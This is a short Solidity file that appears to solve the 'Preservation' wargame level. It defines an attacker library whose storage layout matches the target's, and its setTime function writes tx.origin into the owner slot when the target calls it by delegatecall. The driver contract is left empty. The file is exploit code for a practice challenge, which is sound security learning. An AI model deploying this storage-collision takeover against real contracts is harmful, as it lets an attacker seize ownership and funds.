pragma solidity ^0.7.3;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

// this one will be called by delegatecall
contract PreservationAttackerLib {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttacker {}
